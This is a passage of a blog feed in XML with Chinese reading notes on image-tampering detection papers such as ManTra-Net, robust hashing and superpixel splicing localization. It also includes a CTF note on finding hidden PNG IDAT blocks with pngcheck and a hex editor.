src="https://img-blog.csdnimg.cn/4a16d58e8b8946028be38dc9dada9d51.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 就<strong>F1指标</strong>而言，感觉指标是普遍偏高了，尤其是ELA。</p><h2 id="datasets"><a href="#datasets" class="headerlink" title="datasets"></a>datasets</h2>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fake-image detection with Robust Hashing</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Fake-image%20detection%20with%20Robust%20Hashing/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Fake-image%20detection%20with%20Robust%20Hashing/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  Fake-image detection with Robust Hashing</p><h1 id="Fake-image-detection-with-Robust-Hashing"><a href="#Fake-image-detection-with-Robust-Hashing" class="headerlink" title="Fake-image detection with Robust Hashing"></a>Fake-image detection with Robust Hashing</h1><blockquote></blockquote><p>2021 IEEE 3rd Global Conference on Life Sciences and Technologies<br> (LifeTech 2021)</p><h1 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h1><p>hash 是一个单向不可逆的函数，使用时，只需要当作一个黑盒即可，输出是一个长度固定的消息验证码，输入改变一个字符，输出就有很大的变化。满足雪崩效应。</p><p>按照现今的算力来说，如果使用的hash算法和加密的长度有保证，就有计算安全性保证 。</p><p>拿hash函数做图像篡改检测真的行吗？又不会把原图也给你。要是给原图还真行呢。<br> 我不大相信。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/dcaeaffb41e34d79932d9cecf9ac343d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c647f40226484591a56b8ff07a237120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 这个做法也很简单。两个hash 之间求一个相似度，不一样的数量未达到某个阈值就是篡改图像。</p><p>这个输出结果也不带定位。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a35e2e6422ba43ee8413f2a85bb82299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>浪费了宝贵的1小时。</p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Exploiting Spatial Structure for Localizing Manipulated Image Regions</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Exploiting%20Spatial%20Structure%20for%20Localizing%20Manipulated%20Image%20Regions/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Exploiting%20Spatial%20Structure%20for%20Localizing%20Manipulated%20Image%20Regions/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  Exploiting Spatial Structure for Localizing Manipulated Image Regions</p><h1 id="Exploiting-Spatial-Structure-for-Localizing-Manipulated-Image-Regions"><a href="#Exploiting-Spatial-Structure-for-Localizing-Manipulated-Image-Regions" class="headerlink" title="Exploiting Spatial Structure for Localizing Manipulated Image Regions"></a>Exploiting Spatial Structure for Localizing Manipulated Image Regions</h1><blockquote></blockquote><p>Exploiting Spatial Structure for Localizing Manipulated Image Regions<br>ICCV 2018</p><h1 id="篡改边缘特征"><a href="#篡改边缘特征" class="headerlink" title="篡改边缘特征"></a>篡改边缘特征</h1><p>部分的篡改图像，根本就不符合逻辑，不符合图像的基本语义信息。<br> 剩下的大部分的图像篡改，通过放大图像就可以被人眼识别出来。</p><p>这是篡改水平决定的。</p><p>一般而言，为了边缘的平滑过度，不被人眼识别出怪异，一般在图像篡改后进行边缘的平滑。<br> 因此，放大边缘，一般有锯齿的是真实图像，而很明显的没有锯齿痕迹的往往是篡改图像。<strong>欲盖弥彰。</strong></p><h1 id="网络结构图"><a href="#网络结构图" class="headerlink" title="网络结构图"></a>网络结构图</h1><h1 id="Loss"><a href="#Loss" class="headerlink" title="Loss"></a>Loss</h1><h2 id="对于batch的LOSS"><a href="#对于batch的LOSS" class="headerlink" title="对于ｂａｔｃｈ的LOSS"></a>对于ｂａｔｃｈ的LOSS</h2><p>针对的预测是<strong>Patch labels</strong> ,像是交叉熵loss<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d97025c3f0bc449cbabd1655999bcb3d.png"></p><h2 id="对于单像素的Loss"><a href="#对于单像素的Loss" class="headerlink" title="对于单像素的Loss"></a>对于单像素的Loss</h2><p>就是交叉熵loss<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/e8e2ff097966490ebf0bd768fd66b00b.png"></p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/afd1c75e0d3c41428410e538dd8a5c3a.png"><br> 最终计算的loss为二者简单相加</p><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/94c64b7bb9c34b0db8a6d4fc0b741bc7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYnJpZ2h0ZW5kYXZpZA==,size_20,color_FFFFFF,t_70,g_se,x_16"><br> 那个CRF RNN 是语义分割模型的结果，不知道作者说半天语义分割是想要表达什么。</p><p>由于算法加入了块的预测，并由块的分类结果影响了像素的预测结果，所以会在其中由一些明显的割裂感，是这个小块被预测为正确块的影响，导致了整个小块全部被更改为正确。</p><p>由大而小，分而治之的思想。这种做法理论上还是很有道理的，不知道实际做出来效果怎么样，这篇算法没有测试过。<br> 下面的链接感觉是这篇算法的代码。</p><p><a href="https://github.com/souravdas1/Image-Splicing-Localization/blob/a1150a1a76f40467f0a2c6f735e8ab3871cce8fa/Image_Splicing_Localization.py">https://github.com/souravdas1/Image-Splicing-Localization/blob/a1150a1a76f40467f0a2c6f735e8ab3871cce8fa/Image_Splicing_Localization.py</a></p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDAT block小结</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20IDAT%20block%E5%B0%8F%E7%BB%93/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20IDAT%20block%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  IDAT block小结</p><h1 id="IDAT-block小结"><a href="#IDAT-block小结" class="headerlink" title="IDAT block小结"></a>IDAT block小结</h1><blockquote></blockquote><p>IDAT块隐写–一生之敌</p><blockquote></blockquote><p>IDAT定义：<br> 图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。<br> IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，用户就可以很方便的生成PNG图像。</p><p>一张图片可以有很多的IDAT块。</p><p>说了和没说一样。</p><p>先来说一说这个IDAT块长什么样<br> 这里是16进制下的WINHEX截图<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210329200852954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> IDAT块一般的标识符为<strong>IDAT</strong><br> 只需要搜索这个关键字winhex就会整理出来这个IDAT头了。</p><p>但是一般的IDAT隐写会体现在IDAT块的长度上，会有一些IDAT块有异常的长度，那么就是解题的关键。</p><blockquote></blockquote><p>IDAT有<strong>固定的长度</strong>，正常的<strong>PNG图片</strong>只有最后一个IDAT块的长度是比其他的要短的。</p><p>那么在kali linux中,可以通过以下命令查看IDAT块的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#check png picture idat block error:to see the length of idat block</span><br><span class="line">pngcheck -v 1.png</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210329201528908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 像是上面的一张图就明显的有问题。这个异常在第3个IDAT块中，0x6049位置。</p><blockquote></blockquote><p><strong>首先，789C代表了zlib的头。这个文件一般我们看到他的时候是在binwalk解图片的时候。</strong></p><h2 id="有几张图片，就有几个zlib文件。"><a href="#有几张图片，就有几个zlib文件。" class="headerlink" title="有几张图片，就有几个zlib文件。"></a>有几张图片，就有几个zlib文件。</h2><h2 id="这个很重要"><a href="#这个很重要" class="headerlink" title="这个很重要"></a>这个很重要</h2><blockquote></blockquote><p>那么这里搜出来有<strong>两个789C</strong>就很灵了。</p><p>这两个789C必须要删一个。</p><blockquote></blockquote><p>还有就是必须把包含了<strong>zlib</strong>的一整个IDAT一起删除。</p><p>下面的图就信息量很大。<br> 当然这两个合起来去搜索”IDATx”也不是不行。这样搜出来是两个结果，大概率是带有zlib的IDAT块。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210329204007576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><h1 id="删除第一个"><a href="#删除第一个" class="headerlink" title="删除第一个"></a>删除第一个</h1><p>这张图片有了新的想法。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210329204909362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><h1 id="删除第二个"><a href="#删除第二个" class="headerlink" title="删除第二个"></a>删除第二个</h1><p>无事发生，这张图片就是原本显示的图片。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210329204938461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p><img alt="删除第二个" src="https://img-blog.csdnimg.cn/2021032920463167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 真是神奇呢。。。</p><p>突然觉得所谓的“幻影坦克”是不是可以用类似的原理来分出来两张图片呢。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
            <tag> 竞赛，ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Image Tampering Detection via Semantic Segmentation Network</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Image%20Tampering%20Detection%20via%20Semantic%20Segmentation%20Network/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Image%20Tampering%20Detection%20via%20Semantic%20Segmentation%20Network/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  Image Tampering Detection via Semantic Segmentation Network</p><h1 id="Image-Tampering-Detection-via-Semantic-Segmentation-Network"><a href="#Image-Tampering-Detection-via-Semantic-Segmentation-Network" class="headerlink" title="Image Tampering Detection via Semantic Segmentation Network"></a>Image Tampering Detection via Semantic Segmentation Network</h1><blockquote></blockquote><p>基于语义分割网络的篡改检测<br>Proceedings of ICSP2020</p><blockquote></blockquote><p>基本的思想是 篡改的目的在于混淆，混淆的手段在于语义物体。由此，语义检测的语义信息可以帮助篡改检测。</p><p>觉得很有道理，符合人类正常的思维。之前也有过这样的想法。但是实际上，还是有些差异，这个是使用的网络模型，而不是直接使用网络参数真的做语义分割。</p><p>要是有人实际试一试带有语义分割信息的篡改检测就好了。</p><blockquote></blockquote><p>实际的原理可能在于篡改检测是一种特殊的语义分割问题，人眼无法判断出其中的语义，并不说明实际没有语义差异。</p><h2 id="多任务的模型"><a href="#多任务的模型" class="headerlink" title="多任务的模型"></a>多任务的模型</h2><p>多任务感觉还是很流行的。<br> 尤其是边缘和区域的这种双任务模式。</p><p>但是区域和边缘是可以转化的，不直接使用其中的一个，而用多任务。认为是这个原因。</p><blockquote></blockquote><p>不直接使用区域检测的结果提取边缘 或者直接使用边缘检测填充 说明这个网络结果还是不稳定，检测区域会少检测，检测边缘会漏检测。两种检测结果都是不靠谱的。所以不得不使用多任务。</p><h2 id="边缘标注像素宽度实验"><a href="#边缘标注像素宽度实验" class="headerlink" title="边缘标注像素宽度实验"></a>边缘标注像素宽度实验</h2><p>数据集标注层面<br> 认为标注数据集使用9个像素宽度标注边缘。</p><blockquote></blockquote><p>这个边缘宽度不能太大，也不能太小。过大，特征信息模糊；过小，超过网络学习能力。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9=4*2+1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6cb953d0868149e99b240f797371a885.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/6e966795886e4c6297aa4367d1262c64.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Identification of splicing edges in tampered image based on Dichromatic Reflection Model</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Identification%20of%20splicing%20edges%20in%20tampered%20image%20based%20on%20Dichromatic%20Reflection%20Model/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Identification%20of%20splicing%20edges%20in%20tampered%20image%20based%20on%20Dichromatic%20Reflection%20Model/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  Identification of splicing edges in tampered image based on Dichromatic Reflection Model</p><h1 id="Identification-of-splicing-edges-in-tampered-image-based-on-Dichromatic-Reflection-Model"><a href="#Identification-of-splicing-edges-in-tampered-image-based-on-Dichromatic-Reflection-Model" class="headerlink" title="Identification of splicing edges in tampered image based on Dichromatic Reflection Model"></a>Identification of splicing edges in tampered image based on Dichromatic Reflection Model</h1><h1 id="二色反射模型"><a href="#二色反射模型" class="headerlink" title="二色反射模型"></a>二色反射模型</h1><blockquote></blockquote><p>划分边缘的类型为5类的边缘：<br> 对象边缘、<br> 反射率边缘、<br> 阴影边缘、<br> 镜面边缘<br> 遮挡边缘<br> （按照几何和光度条件划分</p><p><strong>使用两个色彩空间 o1o2 和 S<br> 两个色彩空间对自然边缘和篡改边缘的敏感度是不一样的</strong></p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210716104859391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210716104910858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><h1 id="求边缘"><a href="#求边缘" class="headerlink" title="求边缘"></a>求边缘</h1><blockquote></blockquote><p>使用拉普拉斯滤波器，<br> O1O2通道使用联合梯度<br> 阈值设定为标准差*3</p><blockquote></blockquote><p>当O1O2中检测出边缘<br> 而S未检测出边缘时，判定为篡改边缘</p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Image Splicing Localization Using Superpixel Segmentation and Noise Level Estimation</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Image%20Splicing%20Localization%20Using%20Superpixel%20Segmentation%20and%20Noise%20Level%20Estimation/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Image%20Splicing%20Localization%20Using%20Superpixel%20Segmentation%20and%20Noise%20Level%20Estimation/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  Image Splicing Localization Using Superpixel Segmentation and Noise Level Estimation</p><h1 id="Image-Splicing-Localization-Using-Superpixel-Segmentation-and-Noise-Level-Estimation"><a href="#Image-Splicing-Localization-Using-Superpixel-Segmentation-and-Noise-Level-Estimation" class="headerlink" title="Image Splicing Localization Using Superpixel Segmentation and Noise Level Estimation"></a>Image Splicing Localization Using Superpixel Segmentation and Noise Level Estimation</h1><blockquote></blockquote><p>2019 12th International Congress on Image and Signal Processing,<br> BioMedical Engineering and Informatics (CISP-BMEI)</p><p>根据超像素划分每个图像块，<br> 对每个图像块 求噪声水平，<br> 对于上面的图像块-噪声水平 求聚类</p><p>默认，小的聚类是篡改区域，大的聚类是原本的背景。</p><p>超像素分割有很多的好处，能够划分边界。使用超像素划分图像直接就简化问题。<s>但是splicing里面也有一些路子很野的，不考虑语义信息，乱篡改图像的，这种情况可能就会出现问题了。 因为此时，篡改区域可能被分到不同的超像素中，</s> 这种情况是可行的，因为是聚类。<br> 但是<strong>大面积的篡改</strong>会出现问题，二义性的问题。无法分清篡改区域。灾难性的后果是完全预测反了，指标全部飙0.</p><blockquote></blockquote><p>噪声水平分析：<br> 图像的噪声通常均匀的分布在图像中，如果引入其他图像的图像块，那么splicing 区域的噪声水平将会完全不同。依据此原理，分析篡改的区域。一般是基于块的方法。</p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Image Splicing Forgery Detection Combining Coarse to Refined Convolutional Neural Network and Adapti</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Image%20Splicing%20Forgery%20Detection%20Combining%20Coarse%20to%20Refined%20Convolutional%20Neural%20Network%20and%20Adapti/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20Image%20Splicing%20Forgery%20Detection%20Combining%20Coarse%20to%20Refined%20Convolutional%20Neural%20Network%20and%20Adapti/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  Image Splicing Forgery Detection Combining Coarse to Refined Convolutional Neural Network and Adapti</p><h1 id="Image-Splicing-Forgery-Detection-Combining-Coarse-to-Refined-Convolutional-Neural-Network-and-Adapti"><a href="#Image-Splicing-Forgery-Detection-Combining-Coarse-to-Refined-Convolutional-Neural-Network-and-Adapti" class="headerlink" title="Image Splicing Forgery Detection Combining Coarse to Refined Convolutional Neural Network and Adapti"></a>Image Splicing Forgery Detection Combining Coarse to Refined Convolutional Neural Network and Adapti</h1><blockquote></blockquote><p>重庆邮电大学计算机科学与技术学院。西安电子科技大学网络工程学院</p><p>其实这几个作者发表的论文不少，经常可以看到，而且总是共同发表论文。</p><p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/5c9c2e60eac04197876a422540775310.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYnJpZ2h0ZW5kYXZpZA==,size_20,color_FFFFFF,t_70,g_se,x_16"><br> <s>就是感觉发表的论文虽然多但是，都有点水。</s><br> 记得还有一篇DUnet，也是这个团队发表的。</p><h1 id="网络结构"><a href="#网络结构" class="headerlink" title="网络结构"></a>网络结构</h1><h1 id="Coarse-部分"><a href="#Coarse-部分" class="headerlink" title="Coarse 部分"></a>Coarse 部分</h1><p>预测一个粗略的估计。拿的是vgg16的基本架构。</p><h1 id="Refined-部分"><a href="#Refined-部分" class="headerlink" title="Refined 部分"></a>Refined 部分</h1><p>基本的结构和Coarse 部分相同，可能多了几层的卷积。把Coarse 部分的结果直接输入到Refined 部分。</p><h1 id="后处理部分Adaptive-Clustering-Approach"><a href="#后处理部分Adaptive-Clustering-Approach" class="headerlink" title="后处理部分Adaptive Clustering Approach"></a>后处理部分Adaptive Clustering Approach</h1><p>后处理的手法应该是挑最大的一个聚类，再做一个填充。</p><p>没见过那么粗暴的后处理。</p><p>这个填充法看起来是根据关键点进行连线，再泛洪法填充。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2afe5555b2c2446881821ff31201a983.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYnJpZ2h0ZW5kYXZpZA==,size_16,color_FFFFFF,t_70,g_se,x_16"></p><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ManTra-Net- Manipulation Tracing Network For Detection And Localization of Image Forgeries With Anom</title>
      <link href="/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20ManTra-Net-%20Manipulation%20Tracing%20Network%20For%20Detection%20And%20Localization%20of%20Image%20Forgeries%20With%20Anom/"/>
      <url>/2020/05/27/%E5%8E%9F%E5%88%9B--%20%20ManTra-Net-%20Manipulation%20Tracing%20Network%20For%20Detection%20And%20Localization%20of%20Image%20Forgeries%20With%20Anom/</url>
      
        <content type="html"><![CDATA[<h1 id="原创"><a href="#原创" class="headerlink" title="原创"></a>原创</h1><p>：  ManTra-Net: Manipulation Tracing Network For Detection And Localization of Image Forgeries With Anom</p><h1 id="ManTra-Net-Manipulation-Tracing-Network-For-Detection-And-Localization-of-Image-Forgeries-With-Anom"><a href="#ManTra-Net-Manipulation-Tracing-Network-For-Detection-And-Localization-of-Image-Forgeries-With-Anom" class="headerlink" title="ManTra-Net: Manipulation Tracing Network For Detection And Localization of Image Forgeries With Anom"></a>ManTra-Net: Manipulation Tracing Network For Detection And Localization of Image Forgeries With Anom</h1><blockquote></blockquote><p>篡改检测问题可以看作是特殊的语义分割问题<br>是一个局部异常检测问题。</p><h1 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h1><h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><p><strong>（1）ZPool2D DNN层，以Z-score方式标准化了局部特征与其参考之间的差异；<br> （2）从远到近的分析，该分析对从不同分辨率汇集的ZPool2D特征图执行Conv2DLSTM顺序分析。</strong></p><h2 id="ZPool2D计算"><a href="#ZPool2D计算" class="headerlink" title="ZPool2D计算"></a>ZPool2D计算</h2><p><strong>区域的主要特征定义为所有像素的平均。</strong></p><p>主要特征和其他特征的差异为DF，是像素的数值-主要特征的数值。<br> ZF为DF的标准化。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210718144843107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 像素级的分类。输出每个像素的pred篡改类型，总计为385个小类别。</p><p>385个小类别是由篡改类型分类 7分类 细化分类。<br> <strong>压缩、模糊、形态学、对比度操作、附加噪声、重采样和量化</strong><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/08caf1146987422fb492fdd570143836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/bd2bef426dc24d62b3be9eac7cc0d027.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"><br> 那么这个4个重复的ZPOOL2D是什么意图呢。</p><p>是为了解决在图像中存在多个篡改区域的问题，</p><p>根据各个篡改块之间的相对关系，主要特征UF可能不是原有的图像代表的这个特征UB。</p><p>而变为了篡改区域的特诊UR2。此时，网络无法检测出UR2的篡改区域。</p><p>当存在多个篡改区域时，图像的主要特征UF更接近UR2的情况。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c6584ca2e3ba44bab584ef2cdb1e2240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><p>这个情况下，分割图像块，分别进行预测，就可以缓解这个问题，但是仍然会有问题，可能预测错误的面积会变得更小。<br> 而且分为小块的块的大小很难确定。</p><p>解决方案：使用不同大小的batch 分割图像，并对每个分割块分别进行预测。将预测结果按序输入LSTM，由LSTM提取每个batch的关系。</p><p>原因在于篡改块是由空间局部性联系的。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210718145500544.png"><br> 经过 ZPool2D计算，获得的是多个的batch 块。</p><h3 id="Timeconcat结构"><a href="#Timeconcat结构" class="headerlink" title="Timeconcat结构"></a>Timeconcat结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input_lstm = torch.cat(</span><br><span class="line">           [zpool7.unsqueeze(0), zpool15.unsqueeze(0), zpool31.unsqueeze(0), zpoolglobal.unsqueeze(0)], axis=0)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将所有的Zpooling 堆叠。作为LSTM的input。</p><h2 id="Conv2DLSTM"><a href="#Conv2DLSTM" class="headerlink" title="Conv2DLSTM"></a>Conv2DLSTM</h2><p><strong>人类感知的实质是远近分析，当人看不清时，往往会近些看。</strong></p><p>LSTM从远到近的分析<br> 是一个普通的LSTM 结构</p><h2 id="对于大的篡改区域"><a href="#对于大的篡改区域" class="headerlink" title="对于大的篡改区域"></a>对于大的篡改区域</h2><p>算法设计的核心认为以batch 内的主要特征为主，与这个主要特征完全不一致的认为是篡改的像素，并像素级的分类为不同的篡改类型。</p><h3 id="认定篡改区域小于全像素的一半"><a href="#认定篡改区域小于全像素的一半" class="headerlink" title="认定篡改区域小于全像素的一半"></a>认定篡改区域小于全像素的一半</h3><p>那么，对于这个算法，认定篡改区域小于全像素的一半就极其的重要了。</p><p>若篡改区域大于50% ，则有很大可能，网络认为篡改区域是主要的区域，那么。</p><p>那么在特定的异常样本中，gt的标注和理论上应当预测的结果就会完全的相反。这对于网络的训练是极其的不利的。</p><p>因此，作者规定：若篡改区域大于50%，则 对于权重变化无影响。<br> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/45a1ba1103224594abde2ccdd85a8179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JyaWdodGVuZGF2aWQ=,size_16,color_FFFFFF,t_70"></p><h2 id="篡改区域大小与分类二义性"><a href="#篡改区域大小与分类二义性" class="headerlink" title="篡改区域大小与分类二义性"></a>篡改区域大小与分类二义性</h2><p>这篇文章认定篡改块必然是图像中面积占比较小的一块。</p>]]></content>
      
      
      <categories>
          
          <category> 篡改检测 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
